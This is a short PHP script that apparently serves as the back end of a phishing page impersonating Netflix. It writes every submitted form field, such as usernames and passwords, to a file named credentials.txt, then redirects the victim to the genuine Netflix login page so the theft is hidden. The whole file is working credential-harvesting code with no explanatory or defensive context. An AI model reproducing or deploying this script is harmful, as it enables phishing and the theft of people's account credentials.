<?php

header('Location: https://www.netflix.com/in/login');

$handle=fopen("credentials.txt","a");
foreach ($_POST as $variable=>$value) 
{
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
